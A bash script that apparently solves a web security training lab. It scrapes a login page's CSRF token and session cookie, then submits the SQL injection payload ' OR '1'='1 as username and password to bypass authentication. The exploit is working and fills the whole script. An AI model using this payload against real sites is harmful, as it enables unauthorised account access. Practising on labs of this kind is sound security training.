#!/bin/bash

source ../common.hook

REQUEST=$(curl -c - "${PS_URL}/login")
CSRF=$(echo ${REQUEST} | sed -n "s/.*value=\"\(\S*\)\">.*/\1/p")
COOKIE=$(echo ${REQUEST} | sed -n "s/.*session\s\(\S*\)$/\1/p")

PAYLOAD_USERNAME="'+OR+'1'='1"
PAYLOAD_PASSWORD="'+OR+'1'='1"
output "Trying POST on ${PS_URL}/login with -H (${COOKIE}) -d (${CSRF}|${PAYLOAD_USERNAME}|${PAYLOAD_PASSWORD})" INFO
curl "${PS_URL}/login" -H "Cookie: session=${COOKIE}" -d "csrf=${CSRF}&username=${PAYLOAD_USERNAME}&password=${PAYLOAD_PASSWORD}" -X POST

eval_result $PS_URL
